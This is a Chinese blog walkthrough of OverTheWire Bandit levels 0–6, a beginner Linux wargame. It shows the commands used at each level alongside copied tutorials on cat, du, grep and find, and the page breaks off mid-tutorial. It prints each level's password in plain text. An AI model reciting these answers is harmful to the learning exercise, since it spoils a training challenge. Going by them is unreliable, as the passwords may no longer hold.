<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="BoBo's Blog" type="application/atom+xml" />






<meta property="og:type" content="website">
<meta property="og:title" content="BoBo&#39;s Blog">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="BoBo&#39;s Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="BoBo&#39;s Blog">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/"/>





  <title>BoBo's Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">BoBo's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Day Day Up~</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/28/bandit/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="BoBo">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BoBo's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/28/bandit/" itemprop="url">linux学习记录</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-28T20:49:30+08:00">
                2018-10-28
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>打了一场AWD还有个人赛觉得自己linux的很多命令实在太菜了，找了个网站记录一下。本Blog持续更新。。。<br>网站地址<a href="http://overthewire.org/wargames/bandit/" target="_blank" rel="noopener">bandit</a></p>
<h1 id="Bandit"><a href="#Bandit" class="headerlink" title="Bandit"></a>Bandit</h1><h2 id="bandit0"><a href="#bandit0" class="headerlink" title="bandit0"></a>bandit0</h2><p>The goal of this level is for you to log into the game using SSH. The host to which you need to connect is bandit.labs.overthewire.org, on port 2220. The username is bandit0 and the password is bandit0. Once logged in, go to the Level 1 page to find out how to beat Level 1.<br>这是先要用ssh连接<br>linux下ssh命令：<code>常用格式：ssh [-l login_name] [-p port] [user@]hostname</code><br>题目给出了用户名和密码还有地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh bandit0@bandit.labs.overthewire.org -p 2220</span><br><span class="line">密码：bandit0</span><br></pre></td></tr></table></figure><br>进去需要我们读readme文件：<code>ls</code>–&gt;<code>cat readme</code><br><code>boJ9jbbUNNfktd78OOpsqOltutMc3MY1</code><br>他每一关会告诉你后面需要用什么命令找到什么文件作为下一关的key</p>
<h2 id="bandit-1-2"><a href="#bandit-1-2" class="headerlink" title="bandit 1-2"></a>bandit 1-2</h2><p>The password for the next level is stored in a file called - located in the home directory<br>需要上一关readme作为key登陆bandit1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh bandit1@bandit.labs.overthewire.org -p 2220</span><br><span class="line">密码：boJ9jbbUNNfktd78OOpsqOltutMc3MY1</span><br></pre></td></tr></table></figure><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">需要我们找`-`文件</span><br><span class="line">ls 发现 `-`这里不能直接cat</span><br><span class="line">linux常用于读取文件内容指令主要有以下七种： </span><br><span class="line">cat,tac,nl,more,less,head,tail</span><br><span class="line">cat 文件名 –将文件内容显示在屏幕上 </span><br><span class="line">cat -n 文件名 –将文件内容显示在屏幕上，并显示行号 </span><br><span class="line">cat -b 文件名 –将文件内容显示在屏幕上，并显示行号，但是不显示空白行行号</span><br><span class="line">tac则是和cat反过来的（名字都是反过来的） </span><br><span class="line">tac 文件名 –将文件内容显示在屏幕上，但是是从最后一行开始往前显示 </span><br><span class="line">tac -s separator 文件名 –从separator往后倒序输出，倒序输出不包含separator，输出到最后一行再按照顺序将separator之前的内容输出 </span><br><span class="line">tac -b -s separator 文件名 –从separator往后倒序输出，倒序输出包含separator，输出到最后一行再按照顺序将separator之前的内容输出</span><br><span class="line">cat ./-</span><br><span class="line">CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9</span><br></pre></td></tr></table></figure></p>
<h2 id="bandit-2-3"><a href="#bandit-2-3" class="headerlink" title="bandit 2-3"></a>bandit 2-3</h2><p>The password for the next level is stored in a file called spaces in this filename located in the home directory<br>一样的道理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssh bandit2@bandit.labs.overthewire.org -p 2220</span><br><span class="line">password:CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9</span><br><span class="line">bandit2@bandit:~$ ls</span><br><span class="line">spaces in this filename</span><br><span class="line">bandit2@bandit:~$ cat spaces\ in\ this\ filename </span><br><span class="line">UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK</span><br></pre></td></tr></table></figure></p>
<h2 id="bandit-3-4"><a href="#bandit-3-4" class="headerlink" title="bandit 3-4"></a>bandit 3-4</h2><p>The password for the next level is stored in a hidden file in the inhere directory.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ssh bandit3@bandit.labs.overthewire.org -p 2220</span><br><span class="line">password:UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK</span><br><span class="line">bandit3@bandit:~$ ls</span><br><span class="line">inhere</span><br><span class="line">bandit3@bandit:~$ ls -a</span><br><span class="line"> .bash_logout  .bashrc  inhere  .profile</span><br><span class="line">bandit3@bandit:~$ cat ./inhere</span><br><span class="line">cat: ./inhere: Is a directory</span><br><span class="line">bandit3@bandit:~$ cd inhere</span><br><span class="line">bandit3@bandit:~/inhere$ ls</span><br><span class="line">bandit3@bandit:~/inhere$ ls -a</span><br><span class="line"> .hidden</span><br><span class="line">bandit3@bandit:~/inhere$ cat ./.hidden</span><br><span class="line">2</span><br></pre></td></tr></table></figure><br>可以看到inhere是个文件夹所以不能直接cat，需要cd进入然后列目录，但是这个是个隐藏文件，所以要用到ls -a查看隐藏文件，最后cat文件就行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">以/开头的是绝对目录；不以/开头的是相对目录，也就是在当前目录下的作为基准。</span><br><span class="line">cd 默认是反回上一层目录。</span><br><span class="line">cd .. 也是返回当前目录的上一级目录</span><br><span class="line">cd - 返回到跳转到当前目录之前的上一个操作的目录</span><br><span class="line">cd ~ 回到主目录</span><br><span class="line">pwd 查看当前的目录</span><br><span class="line">mkdir 创建目录</span><br></pre></td></tr></table></figure></p>
<h2 id="bandit-4-5"><a href="#bandit-4-5" class="headerlink" title="bandit 4-5"></a>bandit 4-5</h2><p>连接上以后发现很多文件还是在inhere里面但是不知道那个我们可以访问，所以我们使用<code>file ./*</code>查看所有文件类型，发现第七个是ASCII text直接cat<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bandit4@bandit:~$ cd inhere</span><br><span class="line">bandit4@bandit:~/inhere$ ls</span><br><span class="line">-file00  -file02  -file04  -file06  -file08</span><br><span class="line">-file01  -file03  -file05  -file07  -file09</span><br><span class="line">bandit4@bandit:~/inhere$ file ./*</span><br><span class="line">./-file00: data</span><br><span class="line">./-file01: data</span><br><span class="line">./-file02: data</span><br><span class="line">./-file03: data</span><br><span class="line">./-file04: data</span><br><span class="line">./-file05: data</span><br><span class="line">./-file06: data</span><br><span class="line">./-file07: ASCII text</span><br><span class="line">./-file08: data</span><br><span class="line">./-file09: data</span><br><span class="line">bandit4@bandit:~/inhere$ cat ./-file07</span><br><span class="line">koReBOKuIDDepwhWk7jZC0RTdopnAYKh</span><br></pre></td></tr></table></figure></p>
<h2 id="bandit-5-6"><a href="#bandit-5-6" class="headerlink" title="bandit 5-6"></a>bandit 5-6</h2><p>The password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties:<br>human-readable<br>1033 bytes in size<br>not executable<br>英语和我一样菜的朋友们看过来<br><img src="/2018/10/28/bandit/5-6.jpg" alt=" "><br>要在文件中找到1033b大小的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line">Linux du命令也是查看使用空间的，但是与df命令不同的是Linux du命令是查看当前指定文件或目录(会递归显示子目录)占用磁盘空间大小，还是和df命令有一些区别的.</span><br><span class="line"></span><br><span class="line">1．命令格式：</span><br><span class="line"></span><br><span class="line">du [选项][文件]</span><br><span class="line"></span><br><span class="line">2．命令功能：</span><br><span class="line"></span><br><span class="line">显示每个文件和目录的磁盘使用空间。</span><br><span class="line"></span><br><span class="line">3．命令参数：</span><br><span class="line"></span><br><span class="line">-a或-all  显示目录中个别文件的大小。   </span><br><span class="line"></span><br><span class="line">-b或-bytes  显示目录或文件大小时，以byte为单位。   </span><br><span class="line"></span><br><span class="line">-c或--total  除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和。 </span><br><span class="line"></span><br><span class="line">-k或--kilobytes  以KB(1024bytes)为单位输出。</span><br><span class="line"></span><br><span class="line">-m或--megabytes  以MB为单位输出。   </span><br><span class="line"></span><br><span class="line">-s或--summarize  仅显示总计，只列出最后加总的值。</span><br><span class="line"></span><br><span class="line">-h或--human-readable  以K，M，G为单位，提高信息的可读性。</span><br><span class="line"></span><br><span class="line">-x或--one-file-xystem  以一开始处理时的文件系统为准，若遇上其它不同的文件系统目录则略过。 </span><br><span class="line"></span><br><span class="line">-L&lt;符号链接&gt;或--dereference&lt;符号链接&gt; 显示选项中所指定符号链接的源文件大小。   </span><br><span class="line"></span><br><span class="line">-S或--separate-dirs   显示个别目录的大小时，并不含其子目录的大小。 </span><br><span class="line"></span><br><span class="line">-X&lt;文件&gt;或--exclude-from=&lt;文件&gt;  在&lt;文件&gt;指定目录或文件。   </span><br><span class="line"></span><br><span class="line">--exclude=&lt;目录或文件&gt;         略过指定的目录或文件。    </span><br><span class="line"></span><br><span class="line">-D或--dereference-args   显示指定符号链接的源文件大小。   </span><br><span class="line"></span><br><span class="line">-H或--si  与-h参数相同，但是K，M，G是以1000为换算单位。   </span><br><span class="line"></span><br><span class="line">-l或--count-links   重复计算硬件链接的文件。  </span><br><span class="line">linux中grep命令的用法</span><br><span class="line">作为linux中最为常用的三大文本（awk，sed，grep）处理工具之一，掌握好其用法是很有必要的。</span><br><span class="line"></span><br><span class="line">首先谈一下grep命令的常用格式为：grep  [选项]  ”模式“  [文件]</span><br><span class="line"></span><br><span class="line">grep家族总共有三个：grep，egrep，fgrep。</span><br><span class="line"></span><br><span class="line">常用选项：</span><br><span class="line">　　-E ：开启扩展（Extend）的正则表达式。</span><br><span class="line"></span><br><span class="line">　　-i ：忽略大小写（ignore case）。</span><br><span class="line"></span><br><span class="line">　　-v ：反过来（invert），只打印没有匹配的，而匹配的反而不打印。</span><br><span class="line"></span><br><span class="line">　　-n ：显示行号</span><br><span class="line"></span><br><span class="line">　　-w ：被匹配的文本只能是单词，而不能是单词中的某一部分，如文本中有liker，而我搜寻的只是like，就可以使用-w选项来避免匹配liker</span><br><span class="line"></span><br><span class="line">　　-c ：显示总共有多少行被匹配到了，而不是显示被匹配到的内容，注意如果同时使用-cv选项是显示有多少行没有被匹配到。</span><br><span class="line"></span><br><span class="line">　　-o ：只显示被模式匹配到的字符串。</span><br><span class="line"></span><br><span class="line">　　--color :将匹配到的内容以颜色高亮显示。</span><br><span class="line"></span><br><span class="line">　　-A  n：显示匹配到的字符串所在的行及其后n行，after</span><br><span class="line"></span><br><span class="line">　　-B  n：显示匹配到的字符串所在的行及其前n行，before</span><br><span class="line"></span><br><span class="line">　　-C  n：显示匹配到的字符串所在的行及其前后各n行，context</span><br><span class="line">1.作用</span><br><span class="line">Linux系统中grep命令是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹 配的行打印出来。grep全称是Global Regular Expression Print，表示全局正则表达式版本，它的使用权限是所有用户。</span><br><span class="line">2.格式</span><br><span class="line">grep [options]</span><br><span class="line">3.主要参数</span><br><span class="line">[options]主要参数：</span><br><span class="line"> -a或--text   不要忽略二进制的数据。</span><br><span class="line">  -A&lt;显示列数&gt;或--after-context=&lt;显示列数&gt;   除了显示符合范本样式的那一列之外，并显示该列之后的内容。</span><br><span class="line">  -b或--byte-offset   在显示符合范本样式的那一列之前，标示出该列第一个字符的位编号。</span><br><span class="line">  -B&lt;显示列数&gt;或--before-context=&lt;显示列数&gt;   除了显示符合范本样式的那一列之外，并显示该列之前的内容。</span><br><span class="line">  -c或--count   计算符合范本样式的列数。</span><br><span class="line">  -C&lt;显示列数&gt;或--context=&lt;显示列数&gt;或-&lt;显示列数&gt;   除了显示符合范本样式的那一列之外，并显示该列之前后的内容。</span><br><span class="line">  -d&lt;进行动作&gt;或--directories=&lt;进行动作&gt;   当指定要查找的是目录而非文件时，必须使用这项参数，否则grep指令将回报信息并停止动作。</span><br><span class="line">  -e&lt;范本样式&gt;或--regexp=&lt;范本样式&gt;   指定字符串做为查找文件内容的范本样式。</span><br><span class="line">  -E或--extended-regexp   将范本样式为延伸的普通表示法来使用。</span><br><span class="line">  -f&lt;范本文件&gt;或--file=&lt;范本文件&gt;   指定范本文件，其内容含有一个或多个范本样式，让grep查找符合范本条件的文件内容，格式为每列一个范本样式。</span><br><span class="line">  -F或--fixed-regexp   将范本样式视为固定字符串的列表。</span><br><span class="line">  -G或--basic-regexp   将范本样式视为普通的表示法来使用。</span><br><span class="line">  -h或--no-filename   在显示符合范本样式的那一列之前，不标示该列所属的文件名称。</span><br><span class="line">  -H或--with-filename   在显示符合范本样式的那一列之前，表示该列所属的文件名称。</span><br><span class="line">  -i或--ignore-case   忽略字符大小写的差别。</span><br><span class="line">  -l或--file-with-matches   列出文件内容符合指定的范本样式的文件名称。</span><br><span class="line">  -L或--files-without-match   列出文件内容不符合指定的范本样式的文件名称。</span><br><span class="line">  -n或--line-number   在显示符合范本样式的那一列之前，标示出该列的列数编号。</span><br><span class="line">  -q或--quiet或--silent   不显示任何信息。</span><br><span class="line">  -r或--recursive   此参数的效果和指定“-d recurse”参数相同。</span><br><span class="line">  -s或--no-messages   不显示错误信息。</span><br><span class="line">  -v或--revert-match   反转查找。</span><br><span class="line">  -V或--version   显示版本信息。</span><br><span class="line">  -w或--word-regexp   只显示全字符合的列。</span><br><span class="line">  -x或--line-regexp   只显示全列符合的列。</span><br><span class="line">  -y   此参数的效果和指定“-i”参数相同。</span><br><span class="line">  --help   在线帮助。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pattern正则表达式主要参数：</span><br><span class="line">\： 忽略正则表达式中特殊字符的原有含义。</span><br><span class="line">^：匹配正则表达式的开始行。</span><br><span class="line">$: 匹配正则表达式的结束行。</span><br><span class="line">\&lt;：从匹配正则表达 式的行开始。</span><br><span class="line">\&gt;：到匹配正则表达式的行结束。</span><br><span class="line">[ ]：单个字符，如[A]即A符合要求 。</span><br><span class="line">[ - ]：范围，如[A-Z]，即A、B、C一直到Z都符合要求 。</span><br><span class="line">。：所有的单个字符。</span><br><span class="line">* ：有字符，长度可以为0。</span><br><span class="line"></span><br><span class="line">4.grep命令使用简单实例</span><br><span class="line">$ grep ‘test’ d*</span><br><span class="line">显示所有以d开头的文件中包含 test的行。</span><br><span class="line">$ grep ‘test’ aa bb cc</span><br><span class="line">显示在aa，bb，cc文件中匹配test的行。</span><br><span class="line">$ grep ‘[a-z]\&#123;5\&#125;’ aa</span><br><span class="line">显示所有包含每个字符串至少有5个连续小写字符的字符串的行。</span><br><span class="line">$ grep ‘w\(es\)t.*\1′ aa</span><br><span class="line">如果west被匹配，则es就被存储到内存中，并标记为1，然后搜索任意个字符(.*)，这些字符后面紧跟着 另外一个es(\1)，找到就显示该行。如果用egrep或grep -E，就不用”\”号进行转义，直接写成’w(es)t.*\1′就可以了。</span><br><span class="line">5.grep命令使用复杂实例</span><br><span class="line">假设您正在’/usr/src/Linux/Doc’目录下搜索带字符 串’magic’的文件：</span><br><span class="line">$ grep magic /usr/src/Linux/Doc/*</span><br><span class="line">sysrq.txt:* How do I enable the magic SysRQ key?</span><br><span class="line">sysrq.txt:* How do I use the magic SysRQ key?</span><br><span class="line">其中文件’sysrp.txt’包含该字符串，讨论的是 SysRQ 的功能。</span><br><span class="line">默认情况下，’grep’只搜索当前目录。如果 此目录下有许多子目录，’grep’会以如下形式列出：</span><br><span class="line">grep: sound: Is a directory</span><br><span class="line">这可能会使’grep’ 的输出难于阅读。这里有两种解决的办法：</span><br><span class="line">明确要求搜索子目录：grep -r</span><br><span class="line">或忽略子目录：grep -d skip</span><br><span class="line">如果有很多 输出时，您可以通过管道将其转到’less’上阅读：</span><br><span class="line">$ grep magic /usr/src/Linux/Documentation/* | less</span><br><span class="line">这样，您就可以更方便地阅读。</span><br><span class="line">有一点要注意，您必需提供一个文件过滤方式(搜索全部文件的话用 *)。如果您忘了，’grep’会一直等着，直到该程序被中断。如果您遇到了这样的情况，按 &lt;CTRL c&gt; ，然后再试。</span><br><span class="line">下面还有一些有意思的命令行参数：</span><br><span class="line">grep -i pattern files ：不区分大小写地搜索。默认情况区分大小写，</span><br><span class="line">grep -l pattern files ：只列出匹配的文件名，</span><br><span class="line">grep -L pattern files ：列出不匹配的文件名，</span><br><span class="line">grep -w pattern files ：只匹配整个单词，而不是字符串的一部分(如匹配’magic’，而不是’magical’)，</span><br><span class="line">grep -C number pattern files ：匹配的上下文分别显示[number]行，</span><br><span class="line">grep pattern1 | pattern2 files ：显示匹配 pattern1 或 pattern2 的行，</span><br><span class="line">grep pattern1 files | grep pattern2 ：显示既匹配 pattern1 又匹配 pattern2 的行。</span><br><span class="line">grep -n pattern files  即可显示行号信息</span><br><span class="line">grep -c pattern files  即可查找总行数</span><br><span class="line">这里还有些用于搜索的特殊符号：</span><br><span class="line">\&lt; 和 \&gt; 分别标注单词的开始与结尾。</span><br><span class="line">例如：</span><br><span class="line">grep man * 会匹配 ‘Batman’、’manic’、’man’等，</span><br><span class="line">grep ‘\&lt;man’ * 匹配’manic’和’man’，但不是’Batman’，</span><br><span class="line">grep ‘\&lt;man\&gt;’ 只匹配’man’，而不是’Batman’或’manic’等其他的字符串。</span><br><span class="line">‘^’：指匹配的字符串在行首，</span><br><span class="line">‘$’：指匹配的字符串在行 尾，</span><br></pre></td></tr></table></figure><br>所以我们可以使用下面的命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bandit5@bandit:~/inhere$ du ./* -a -b | grep 1033</span><br><span class="line">1033	./maybehere07/.file2</span><br><span class="line">bandit5@bandit:~/inhere$ cat ./maybehere07/.file2</span><br><span class="line">DXjZPULLxYr17uwoI01bNLQbtFemEgo7</span><br></pre></td></tr></table></figure></p>
<h2 id="bandit-6-7"><a href="#bandit-6-7" class="headerlink" title="bandit 6-7"></a>bandit 6-7</h2><p>The password for the next level is stored somewhere on the server and has all of the following properties:<br>owned by user bandit7<br>owned by group bandit6<br>33 bytes in size<br>本题需要我们找到用户bandit7但是属于bandit6用户组，大小为33bytes的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">介绍一下find命令用法</span><br><span class="line">find命令</span><br><span class="line"></span><br><span class="line">　　　　基本格式：find  path expression</span><br><span class="line"></span><br><span class="line">　　　　1.按照文件名查找</span><br><span class="line"></span><br><span class="line">　　　　(1)find / -name httpd.conf　　#在根目录下查找文件httpd.conf，表示在整个硬盘查找</span><br><span class="line">　　　　(2)find /etc -name httpd.conf　　#在/etc目录下文件httpd.conf</span><br><span class="line">　　　　(3)find /etc -name &apos;*srm*&apos;　　#使用通配符*(0或者任意多个)。表示在/etc目录下查找文件名中含有字符串‘srm’的文件</span><br><span class="line">　　　　(4)find . -name &apos;srm*&apos; 　　#表示当前目录下查找文件名开头是字符串‘srm’的文件</span><br><span class="line"></span><br><span class="line">　　　　2.按照文件特征查找 　　　　</span><br><span class="line"></span><br><span class="line">　　　　(1)find / -amin -10 　　# 查找在系统中最后10分钟访问的文件(access time)</span><br><span class="line">　　　　(2)find / -atime -2　　 # 查找在系统中最后48小时访问的文件</span><br><span class="line">　　　　(3)find / -empty 　　# 查找在系统中为空的文件或者文件夹</span><br><span class="line">　　　　(4)find / -group cat 　　# 查找在系统中属于 group为cat的文件</span><br><span class="line">　　　　(5)find / -mmin -5 　　# 查找在系统中最后5分钟里修改过的文件(modify time)</span><br><span class="line">　　　　(6)find / -mtime -1 　　#查找在系统中最后24小时里修改过的文件</span><br><span class="line">　　　　(7)find / -user fred 　　#查找在系统中属于fred这个用户的文件</span><br><span class="line">　　　　(8)find / -size +10000c　　#查找出大于10000000字节的文件(c:字节，w:双字，k:KB，M:MB，G:GB)</span><br><span class="line">　　　　(9)find / -size -1000k 　　#查找出小于1000KB的文件</span><br><span class="line"></span><br><span class="line">　　　　3.使用混合查找方式查找文件</span><br><span 